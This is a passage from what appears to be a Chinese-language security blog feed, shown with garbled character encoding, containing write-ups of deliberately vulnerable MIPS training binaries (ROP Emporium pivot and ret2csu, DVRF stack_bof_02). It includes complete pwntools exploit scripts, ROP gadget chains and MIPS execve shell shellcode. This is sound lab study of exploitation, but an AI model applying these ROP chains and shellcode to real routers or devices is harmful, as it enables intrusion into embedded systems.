class="hljs-string">&#x27;-L&#x27;</span>,<span class="hljs-string">&#x27;/usr/mipsel-linux-gnu&#x27;</span>,<span class="hljs-string">&#x27;./pivot_mipsel&#x27;</span>])<br>context(arch=<span class="hljs-string">&#x27;mips&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, endian=<span class="hljs-string">&#x27;little&#x27;</span>, log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>gadget1 = <span class="hljs-number">0x400ca0</span><br>gadget2 = <span class="hljs-number">0x400cb0</span><br>gadget3 = <span class="hljs-number">0x400cc4</span><br>gadget4 = <span class="hljs-number">0x400cd0</span><br><br>foothold = <span class="hljs-number">0x400e60</span><br>foothold_got = <span class="hljs-number">0x412060</span><br><br>p.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>pivot_addr = <span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>, drop=<span class="hljs-literal">True</span>), <span class="hljs-number">16</span>)<br><br>payload1 = p32(<span class="hljs-number">0</span>) + p32(<span class="hljs-number">0</span>) + p32(gadget1) + p32(<span class="hljs-number">0</span>) +  p32(<span class="hljs-number">0x378</span>) + p32(foothold)<br>payload1 += p32(<span class="hljs-number">0</span>) + p32(foothold_got) + p32(gadget1) + p32(<span class="hljs-number">0</span>) +  p32(<span class="hljs-number">0x378</span>) + p32(gadget3)<br>p.sendafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>, payload1)<br><br>payload2 = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">32</span> + p32(pivot_addr) + p32(gadget4)<br>p.sendafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>, payload2)<br>p.recvuntil(<span class="hljs-string">b&#x27;ROPE&#x27;</span>)<br></code></pre></td></tr></table></figure><h4 id="8-ret2csu"><a href="#8-ret2csu" class="headerlink" title="8.ret2csu"></a>8.ret2csu</h4><p>ä½¿ç”¨glibcç¼–è¯‘çš„Â·MIPSæ¶æ„ç¨‹åºåŒæ ·æ‹¥æœ‰libc_csu_initæ®µï¼Œæ‰€ä»¥ä½¿ç”¨ret2csuè°ƒç”¨ret2winå‡½æ•°ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;ret2csu_mipsel&#x27;</span>)<br>p = process([<span class="hljs-string">&#x27;qemu-mipsel&#x27;</span>,<span class="hljs-string">&#x27;-L&#x27;</span>,<span class="hljs-string">&#x27;/usr/mipsel-linux-gnu&#x27;</span>,<span class="hljs-string">&#x27;./ret2csu_mipsel&#x27;</span>])<br>context(arch=<span class="hljs-string">&#x27;mips&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, endian=<span class="hljs-string">&#x27;little&#x27;</span>, log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>gadget1 = <span class="hljs-number">0x4009c0</span><br>gadget2 = <span class="hljs-number">0x4009a0</span><br><br>key1 = <span class="hljs-number">0xDEADBEEF</span><br>key2 = <span class="hljs-number">0xCAFEBABE</span><br>key3 = <span class="hljs-number">0xD00DF00D</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">36</span> + p32(gadget1) + <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x1c</span><br>payload += p32(<span class="hljs-number">0x411058</span>)<br>payload += p32(<span class="hljs-number">0</span>)<br>payload += p32(<span class="hljs-number">1</span>)<br>payload += p32(key1)<br>payload += p32(key2)<br>payload += p32(key3)<br>payload += p32(gadget2)<br>payload += p32(<span class="hljs-number">0</span>) * <span class="hljs-number">7</span><br><br>p.sendafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>, payload)<br>p.recvuntil(<span class="hljs-string">b&#x27;ROPE&#x27;</span>)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>DVRFè·¯ç”±æ¼æ´é¶æœºä¸­å‡ é“é¢˜çš„å¤ç°</title>
    <link href="/2022/11/08/DVRF%E8%B7%AF%E7%94%B1%E9%9D%B6%E6%9C%BA/"/>
    <url>/2022/11/08/DVRF%E8%B7%AF%E7%94%B1%E9%9D%B6%E6%9C%BA/</url>
    
    <content type="html"><![CDATA[<p>é¡¹ç›®åœ°å€ï¼š<a href="https://github.com/praetorian-inc/DVRF">https://github.com/praetorian-inc/DVRF</a></p><p>ä½¿ç”¨binwalkæå–å›ºä»¶DVRF_v03.bin</p><p>æœ¬åœ°ç¯å¢ƒï¼škali-2022.2ï¼Œqemu-7.0</p><h3 id="stack-bof-02"><a href="#stack-bof-02" class="headerlink" title="stack_bof_02"></a>stack_bof_02</h3><h4 id="æ ˆæº¢å‡ºåˆ†æ"><a href="#æ ˆæº¢å‡ºåˆ†æ" class="headerlink" title="æ ˆæº¢å‡ºåˆ†æ"></a>æ ˆæº¢å‡ºåˆ†æ</h4><p>ä½¿ç”¨idaåˆ†æï¼Œä½¿ç”¨strcpyäº†å‡½æ•°ï¼Œåªè¦ä¸å‡ºç°\x00å­—ç¬¦ï¼Œå°±å¯ä»¥å®ç°æ ˆæº¢å‡ºã€‚</p><p>å¯åŠ¨ç¨‹åºï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">qemu-mipsel -L .<span class="hljs-regexp">/ -g 1234 ./</span>pwnable<span class="hljs-regexp">/ShellCode_Required/</span>stack_bof_02 aaaaaaaaaaaaa<br></code></pre></td></tr></table></figure><p>å…³äºæº¢å‡ºçš„å­—èŠ‚æ•°ï¼Œæˆ‘æ˜¯ç›´æ¥ç”¨pwndbgè§‚å¯Ÿæ ˆä¸Šçš„åœ°å€å’Œç¨‹åºä¸­çš„æ±‡ç¼–è®¡ç®—å‡ºçš„ï¼š0x407ffdd0 + 0x214 -  0x407ffde8 &#x3D; 0x1fc</p><p>â€‹       <img src="/img/5/Screenshot_20221110_055957.png" style="zoom:67%;" />        </p><p>â€‹                                                                     </p><p>ç”±äºæ²¡æœ‰åé—¨å‡½æ•°ï¼Œè¿™é‡Œå¯ä»¥ä½¿ç”¨shellcodeï¼Œ</p><ol><li>MIPSä¸æ”¯æŒNXä¿æŠ¤ï¼Œå†™å…¥æ ˆä¸­çš„shellcodeå¯ä»¥ç›´æ¥è¢«æ‰§è¡Œï¼›</li><li>ä½¿ç”¨ROPåŠ«æŒæ§åˆ¶æµï¼Œè™½ç„¶ç¨‹åºgadgetå¾ˆå°‘ï¼Œä½†libcæ–‡ä»¶ä¸­æœ‰å¤§é‡çš„gadgetï¼Œä¸”qemuæ¨¡æ‹Ÿæ— æ³•åšåˆ°åœ°å€éšæœºåŒ–ï¼Œlibcçš„åŸºåœ°å€æ¯æ¬¡å¯åŠ¨ä¹Ÿéƒ½æ˜¯å›ºå®šçš„ï¼›</li><li>ç”±äºç¼“å­˜ä¸ä¸€è‡´æ€§ï¼ŒæŒ‡ä»¤cacheå’Œæ•°æ®cacheä¸¤è€…çš„åŒæ­¥éœ€è¦ä¸€ä¸ªæ—¶é—´æ¥åŒæ­¥ï¼Œå¦åˆ™å°±ä¼šå¤±æ•ˆï¼›è¿™é‡Œéœ€è¦è°ƒç”¨sleepå‡½æ•°æ¥è®©shellcodeä»æ•°æ®cacheåˆ·æ–°åˆ°æŒ‡ä»¤cacheï¼Œç„¶ååœ¨è·³è½¬åˆ°shellcodeå»æ‰§è¡Œã€‚</li></ol><p>libcåŸºåœ°å€çš„å¯»æ‰¾ï¼š</p> <img src="/img/5/Screenshot_20221110_052742.png" style="zoom:67%;" /><p>æŸ¥çœ‹putså‡½æ•°çš„è°ƒç”¨ ,ç„¶ååœ¨libcæ–‡ä»¶ä¸­æ‰¾åˆ°åç§» 0x3fefc420 - 0x17420  &#x3D; 0x3fee5000 ï¼ˆä¸åŒçš„ç¯å¢ƒæ¨¡æ‹Ÿå‡ºçš„åœ°å€ä¹Ÿä¼šæœ‰æ‰€ä¸åŒï¼‰</p><h4 id="ç¼–å†™ROP"><a href="#ç¼–å†™ROP" class="headerlink" title="ç¼–å†™ROP"></a>ç¼–å†™ROP</h4><p>è¿™é‡Œæˆ‘æ˜¯å‚è€ƒH4loå¸ˆå‚…çš„<a href="https://www.cnblogs.com/H4lo/p/10542913.html">æ–‡ç« </a>å»å¯»æ‰¾çš„gadget</p><p>ä½¿ç”¨mipsropæ‰¾åˆ°çš„gadgetè·³è½¬åˆ°æŒ‡å®šåœ°å€å¤§å¤šéƒ½æ˜¯é€šè¿‡å¦ä¸€ä¸ªå¯„å­˜å™¨å»èµ‹å€¼ï¼Œè€ŒåŸç¨‹åºä¸­æˆ‘ä»¬æº¢å‡ºååªèƒ½æ§åˆ¶$raå¯„å­˜å™¨ï¼Œæ— æ³•æ§åˆ¶æ›´å¤šçš„å¯„å­˜å™¨ï¼›ä¸ºäº†æ–¹ä¾¿gadgetçš„ä½¿ç”¨ï¼Œé¦–å…ˆæº¢å‡ºååŠ«æŒåˆ°scandirå‡½æ•°ç»“å°¾éƒ¨åˆ†ï¼Œè®©æˆ‘ä»¬å¯ä»¥æ§åˆ¶æ›´å¤šçš„å¯„å­˜å™¨ï¼š</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-class">.text</span>:<span class="hljs-number">0000</span>AFE0 <span class="hljs-number">3</span>C <span class="hljs-number">00</span> BF <span class="hljs-number">8</span>F                   lw      <span class="hljs-variable">$ra</span>, <span class="hljs-number">0</span>x18+<span class="hljs-built_in">var_s24</span>(<span class="hljs-variable">$sp</span>)<br><span class="hljs-selector-class">.text</span>:<span class="hljs-number">0000</span>AFE4 <span class="hljs-number">38</span> <span class="hljs-number">00</span> BE <span class="hljs-number">8</span>F                   lw      <span class="hljs-variable">$fp</span>, <span class="hljs-number">0</span>x18+<span class="hljs-built_in">var_s20</span>(<span class="hljs-variable">$sp</span>)<br><span class="hljs-selector-class">.text</span>:<span class="hljs-number">0000</span>AFE8 <span class="hljs-number">34</span> <span class="hljs-number">00</span> B7 <span class="hljs-number">8</span>F                   lw      <span class="hljs-variable">$s7</span>, <span class="hljs-number">0</span>x18+<span class="hljs-built_in">var_s1C</span>(<span class="hljs-variable">$sp</span>)<br><span class="hljs-selector-class">.text</span>:<span class="hljs-number">0000</span>AFEC <span class="hljs-number">30</span> <span class="hljs-number">00</span> B6 <span class="hljs-number">8</span>F                   lw      <span class="hljs-variable">$s6</span>, <span class="hljs-number">0</span>x18+<span class="hljs-built_in">var_s18</span>(<span class="hljs-variable">$sp</span>)<br><span class="hljs-selector-class">.text</span>:<span class="hljs-number">0000</span>AFF0 <span class="hljs-number">2</span>C <span class="hljs-number">00</span> B5 <span class="hljs-number">8</span>F                   lw      <span class="hljs-variable">$s5</span>, <span class="hljs-number">0</span>x18+<span class="hljs-built_in">var_s14</span>(<span class="hljs-variable">$sp</span>)<br><span class="hljs-selector-class">.text</span>:<span class="hljs-number">0000</span>AFF4 <span class="hljs-number">28</span> <span class="hljs-number">00</span> B4 <span class="hljs-number">8</span>F                   lw      <span class="hljs-variable">$s4</span>, <span class="hljs-number">0</span>x18+<span class="hljs-built_in">var_s10</span>(<span class="hljs-variable">$sp</span>)<br><span class="hljs-selector-class">.text</span>:<span class="hljs-number">0000</span>AFF8 <span class="hljs-number">24</span> <span class="hljs-number">00</span> B3 <span class="hljs-number">8</span>F                   lw      <span class="hljs-variable">$s3</span>, <span class="hljs-number">0</span>x18+<span class="hljs-built_in">var_sC</span>(<span class="hljs-variable">$sp</span>)<br><span class="hljs-selector-class">.text</span>:<span class="hljs-number">0000</span>AFFC <span class="hljs-number">20</span> <span class="hljs-number">00</span> B2 <span class="hljs-number">8</span>F                   lw      <span class="hljs-variable">$s2</span>, <span class="hljs-number">0</span>x18+<span class="hljs-built_in">var_s8</span>(<span class="hljs-variable">$sp</span>)<br><span class="hljs-selector-class">.text</span>:<span class="hljs-number">0000</span>B000 <span class="hljs-number">1</span>C <span class="hljs-number">00</span> B1 <span class="hljs-number">8</span>F                   lw      <span class="hljs-variable">$s1</span>, <span class="hljs-number">0</span>x18+<span class="hljs-built_in">var_s4</span>(<span class="hljs-variable">$sp</span>)<br><span class="hljs-selector-class">.text</span>:<span class="hljs-number">0000</span>B004 <span class="hljs-number">18</span> <span class="hljs-number">00</span> B0 <span class="hljs-number">8</span>F                   lw      <span class="hljs-variable">$s0</span>, <span class="hljs-number">0</span>x18+<span class="hljs-built_in">var_s0</span>(<span class="hljs-variable">$sp</span>)<br><span class="hljs-selector-class">.text</span>:<span class="hljs-number">0000</span>B008 <span class="hljs-number">08</span> <span class="hljs-number">00</span> E0 <span class="hljs-number">03</span>                   jr      <span class="hljs-variable">$ra</span><br><span class="hljs-selector-class">.text</span>:<span class="hljs-number">0000</span>B00C <span class="hljs-number">40</span> <span class="hljs-number">00</span> BD <span class="hljs-number">27</span>                   addiu   <span class="hljs-variable">$sp</span>, <span class="hljs-number">0</span>x40<br></code></pre></td></tr></table></figure><p>å†ä½¿ç”¨mipsrop.find(â€œli $a0,1â€)æ‰¾åˆ°ç›¸åº”çš„gadgetï¼Œå°†$a0èµ‹å€¼ä¸º1ï¼Œä½œä¸ºsleepå‡½æ•°çš„å‚æ•°ï¼Œå¦‚æœ$a0æœ¬èº«å°±å­˜åœ¨å€¼ä¹Ÿå¯ä»¥ä¸ç”¨è¿™ä¸ªæ“ä½œï¼Œå¯èƒ½sleepçš„æ—¶é—´ä¼šé•¿ä¸€ç‚¹ï¼š</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mel">.<span class="hljs-keyword">text</span>:<span class="hljs-number">0002</span>FB10 <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">04</span> <span class="hljs-number">24</span>                   li      $a0, <span class="hljs-number">1</span><br>.<span class="hljs-keyword">text</span>:<span class="hljs-number">0002</span>FB14 <span class="hljs-number">21</span> C8 <span class="hljs-number">20</span> <span class="hljs-number">02</span>                   <span class="hljs-keyword">move</span>    $t9, $s1<br>.<span class="hljs-keyword">text</span>:<span class="hljs-number">0002</span>FB18 <span class="hljs-number">09</span> F8 <span class="hljs-number">20</span> <span class="hljs-number">03</span>                   jalr    $t9<br></code></pre></td></tr></table></figure><p>è°ƒç”¨sleepå‡½æ•°åè¿˜éœ€è¦è¿›ä¸€æ­¥è°ƒç”¨shellcodeï¼Œæ‰€ä»¥ç»™$a0èµ‹å€¼å€¼åä¸èƒ½ç›´æ¥å»æ‰§è¡Œsleepå‡½æ•°ï¼Œè¿™é‡Œè¦è¿›ä¸€æ­¥è°ƒç”¨xdr_unionå‡½æ•°ç»“å°¾éƒ¨åˆ†ï¼Œæ‰§è¡Œå®Œsleepå‡½æ•°åå¯ä»¥ç»§ç»­æ²¿ç€ROPé“¾æ‰§è¡Œï¼š</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-symbol">.text:</span><span class="hljs-number">00021</span>C34 <span class="hljs-number">21</span> C8 <span class="hljs-number">60</span> <span class="hljs-number">02</span>                   <span class="hljs-keyword">move </span>   $<span class="hljs-built_in">t9</span>, $<span class="hljs-built_in">s3</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">00021</span>C38 <span class="hljs-number">2</span>C <span class="hljs-number">00</span> <span class="hljs-keyword">BF </span><span class="hljs-number">8</span>F                   <span class="hljs-keyword">lw </span>     $<span class="hljs-built_in">ra</span>, <span class="hljs-number">0x18</span>+var_s14($<span class="hljs-built_in">sp</span>)<br><span class="hljs-symbol">.text:</span><span class="hljs-number">00021</span>C3C <span class="hljs-number">28</span> <span class="hljs-number">00</span> <span class="hljs-keyword">B4 </span><span class="hljs-number">8</span>F                   <span class="hljs-keyword">lw </span>     $<span class="hljs-built_in">s4</span>, <span class="hljs-number">0x18</span>+var_s10($<span class="hljs-built_in">sp</span>)<br><span class="hljs-symbol">.text:</span><span class="hljs-number">00021</span>C40 <span class="hljs-number">24</span> <span class="hljs-number">00</span> <span class="hljs-keyword">B3 </span><span class="hljs-number">8</span>F                   <span class="hljs-keyword">lw </span>     $<span class="hljs-built_in">s3</span>, <span class="hljs-number">0x18</span>+var_sC($<span class="hljs-built_in">sp</span>)<br><span class="hljs-symbol">.text:</span><span class="hljs-number">00021</span>C44 <span class="hljs-number">20</span> <span class="hljs-number">00</span> <span class="hljs-keyword">B2 </span><span class="hljs-number">8</span>F                   <span class="hljs-keyword">lw </span>     $<span class="hljs-built_in">s2</span>, <span class="hljs-number">0x18</span>+var_s8($<span class="hljs-built_in">sp</span>)<br><span class="hljs-symbol">.text:</span><span class="hljs-number">00021</span>C48 <span class="hljs-number">1</span>C <span class="hljs-number">00</span> <span class="hljs-keyword">B1 </span><span class="hljs-number">8</span>F                   <span class="hljs-keyword">lw </span>     $<span class="hljs-built_in">s1</span>, <span class="hljs-number">0x18</span>+var_s4($<span class="hljs-built_in">sp</span>)<br><span class="hljs-symbol">.text:</span><span class="hljs-number">00021</span>C4C <span class="hljs-number">18</span> <span class="hljs-number">00</span> <span class="hljs-keyword">B0 </span><span class="hljs-number">8</span>F                   <span class="hljs-keyword">lw </span>     $<span class="hljs-built_in">s0</span>, <span class="hljs-number">0x18</span>+var_s0($<span class="hljs-built_in">sp</span>)<br><span class="hljs-symbol">.text:</span><span class="hljs-number">00021</span>C50 <span class="hljs-number">08</span> <span class="hljs-number">00</span> <span class="hljs-number">20</span> <span class="hljs-number">03</span>                   <span class="hljs-keyword">jr </span>     $<span class="hljs-built_in">t9</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">00021</span>C54 <span class="hljs-number">30</span> <span class="hljs-number">00</span> <span class="hljs-keyword">BD </span><span class="hljs-number">27</span>                   <span class="hljs-keyword">addiu </span>  $<span class="hljs-built_in">sp</span>, <span class="hljs-number">0x30</span><br></code></pre></td></tr></table></figure><p>æœ€åä½¿ç”¨mipsrop.stackfinders()æ‰¾åˆ°è·å–æ ˆåœ°å€çš„ç›¸å¯¹åç§»çš„gadgetï¼›ä½¿ç”¨mipsrop.tail()æˆ–mipsrop.find(â€œâ€)æ‰¾åˆ°è·³è½¬åœ°å€çš„gadgetï¼Œé€šè¿‡åç§»é‡å†™å…¥shellcodeï¼Œæ‰¾å‡ºå¦‚ä¸‹gadgetï¼š</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs maxima">.text:<span class="hljs-number">0001B230</span> <span class="hljs-number">21</span> C8 <span class="hljs-number">00</span> <span class="hljs-number">02</span>                   move    $t9, $s0<br>.text:<span class="hljs-number">0001B234</span> <span class="hljs-number">09</span> F8 <span class="hljs-number">20</span> <span class="hljs-number">03</span>                   jalr    $t9<br>.text:<span class="hljs-number">0001B238</span> <span class="hljs-number">28</span> <span class="hljs-number">00</span> A4 <span class="hljs-number">27</span>                   addiu   $a0, $sp, <span class="hljs-number">0x38</span>+var_10<br><br>.text:<span class="hljs-number">000214A0</span> <span class="hljs-number">21</span> C8 <span class="hljs-number">80</span> <span class="hljs-number">00</span>                   move    $t9, $a0<br>.text:<span class="hljs-number">000214A4</span> <span class="hljs-number">18</span> <span class="hljs-number">00</span> A2 AF                   sw      $v0, <span class="hljs-number">0x30</span>+var_18($sp)<br>.text:<span class="hljs-number">000214A8</span> <span class="hljs-number">09</span> F8 <span class="hljs-number">20</span> <span class="hljs-number">03</span>                   jalr    $t9<br>.text:<span class="hljs-number">000214AC</span> <span class="hljs-number">18</span> <span class="hljs-number">00</span> A4 <span class="hljs-number">27</span>                   addiu   $a0, $sp, <span class="hljs-number">0x30</span>+var_18<br></code></pre></td></tr></table></figure><p>â€‹                             </p><p>å®Œæ•´çš„ROPå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>context(arch=<span class="hljs-string">&#x27;mips&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>libcbase = <span class="hljs-number">0x3fee5000</span><br><br>_sleep = libcbase + <span class="hljs-number">0x2f2b0</span><br><br>shellcode = asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    slti $a2, $zero, -1</span><br><span class="hljs-string">    li $t7, 0x69622f2f</span><br><span class="hljs-string">    sw $t7, -12($sp)</span><br><span class="hljs-string">    li $t6, 0x68732f6e</span><br><span class="hljs-string">    sw $t6, -8($sp)</span><br><span class="hljs-string">    sw $zero, -4($sp)</span><br><span class="hljs-string">    la $a0, -12($sp)</span><br><span class="hljs-string">    slti $a1, $zero, -1</span><br><span class="hljs-string">    li $v0, 4011</span><br><span class="hljs-string">    syscall 0x40404</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br><br>payload =  <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x1fc</span> + p32(libcbase + <span class="hljs-number">0xafe0</span>)<br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x18</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span>    <span class="hljs-comment">#s0</span><br>payload += p32(libcbase + <span class="hljs-number">0x21c34</span>)    <span class="hljs-comment">#s1</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span>     <span class="hljs-comment">#s2</span><br>payload += p32(_sleep)    <span class="hljs-comment">#s3</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span>    <span class="hljs-comment">#s4</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span>    <span class="hljs-comment">#s5</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span>    <span class="hljs-comment">#s6</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span>    <span class="hljs-comment">#s7</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span>    <span class="hljs-comment">#fp</span><br>payload += p32(libcbase + <span class="hljs-number">0x2fb10</span>)    <span class="hljs-comment">#ra</span><br><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x18</span><br>payload += p32(libcbase + <span class="hljs-number">0x214a0</span>)    <span class="hljs-comment">#s0</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span>    <span class="hljs-comment">#s1</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span>    <span class="hljs-comment">#s2</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span>    <span class="hljs-comment">#s3</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span>    <span class="hljs-comment">#s4</span><br>payload += p32(libcbase + <span class="hljs-number">0x1b230</span>)<br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x28</span><br>payload += shellcode<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;payload&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    f.write(payload)<br></code></pre></td></tr></table></figure><p>æœ€åè°ƒç”¨è¯¥payload</p><img src="/img/5/Screenshot_20221111_032920.png" style="zoom:67%;" /><h4 id="é¢˜å¤–è¯"><a href="#é¢˜å¤–è¯" class="headerlink" title="é¢˜å¤–è¯"></a>é¢˜å¤–è¯</h4><p>H4loå¸ˆå‚…ç¬¬ä¸€ä¸ªç‰ˆæœ¬çš„ROPé€šè¿‡mipsrop.stackfinders()æ˜¯æ‰¾åˆ° <code>0x000171CC</code> è¿™ä¸€å¤„çš„ gadgetï¼š</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mel">.<span class="hljs-keyword">text</span>:<span class="hljs-number">000171</span>CC <span class="hljs-number">18</span> <span class="hljs-number">00</span> A4 <span class="hljs-number">27</span>                   addiu   $a0, $sp, <span class="hljs-number">0x38</span>+var_20<br>.<span class="hljs-keyword">text</span>:<span class="hljs-number">000171</span>D0 <span class="hljs-number">21</span> C8 <span class="hljs-number">60</span> <span class="hljs-number">02</span>                   <span class="hljs-keyword">move</span>    $t9, $s3<br>.<span class="hljs-keyword">text</span>:<span class="hljs-number">000171</span>D4 <span class="hljs-number">09</span> F8 <span class="hljs-number">20</span> <span class="hljs-number">03</span>                   jalr    $t9<br>.<span class="hljs-keyword">text</span>:<span class="hljs-number">000171</span>D8 <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">05</span> <span class="hljs-number">24</span>                   li      $a1, <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>æœ€åä¹Ÿæ˜¯é€šè¿‡<code>0x000214A0</code> çš„gadgetè·³è½¬åˆ°shellcodeï¼Œ<code>0x000171CC</code> å¤„çš„ gadgetè·å–æ ˆåœ°å€çš„ç›¸å¯¹åç§»æ˜¯sp + 0x18ï¼Œå¹¶ä¾æ­¤å†™å…¥0x18å­—èŠ‚çš„æ•°æ®å¡«å……ï¼Œç„¶åå†™å…¥shellcodeï¼Œè€Œ<code>0x000214A0</code> å¤„ä¼šæœ‰<code>sw   $v0, 0x18($sp)</code>çš„æ“ä½œï¼Œæœ€åä¼šå°†shellcodeçš„å‰4ä½å­—èŠ‚èµ‹å€¼ä¸º$v0å¯„å­˜å™¨çš„å€¼ï¼Œå¦‚ä¸‹å›¾ï¼š</p><img src="/img/5/Screenshot_20221110_053319.png" style="zoom: 80%;" /><p>è™½ç„¶æœ€åä¹Ÿå¯ä»¥æˆåŠŸæ‰§è¡Œshellcodeï¼Œä½†æ˜¯å¯¹äºåé¢çš„socket_bofè¿™ç§é¢˜å°±æ— æ³•æˆåŠŸï¼›æ‰€ä»¥æœ€å¥½ç»§ç»­å¤šå†™å…¥4å­—èŠ‚çš„æ•°æ®å¡«å……ï¼Œç„¶åå†™å…¥shellcodeï¼Œè¿™æ ·å°±ä¸ä¼šè®©shellcodeä¸Šçš„æ•°æ®è¢«ä¿®æ”¹ã€‚</p><p>ä¸è¿‡H4loå¸ˆå‚…ç¬¬äºŒä¸ªç‰ˆæœ¬çš„ROPå°±æ²¡æœ‰ä½¿ç”¨è¯¥å¤„çš„gadgetã€‚</p><h3 id="socket-bof"><a href="#socket-bof" class="headerlink" title="socket_bof"></a>socket_bof</h3><p>ä½¿ç”¨idaæŸ¥çœ‹ä¼ªä»£ç ï¼š</p><p><img src="/img/5/Screenshot_20221111_090157.png"></p><p>readå‡½æ•°è¾“å…¥å­—ç¬¦åˆ°v10ä¸Šåï¼Œå†ç”±sprintfå‡½æ•°å°†v10çš„å­—ç¬¦åŠ ä¸Šâ€œnom nom nom, you sent me 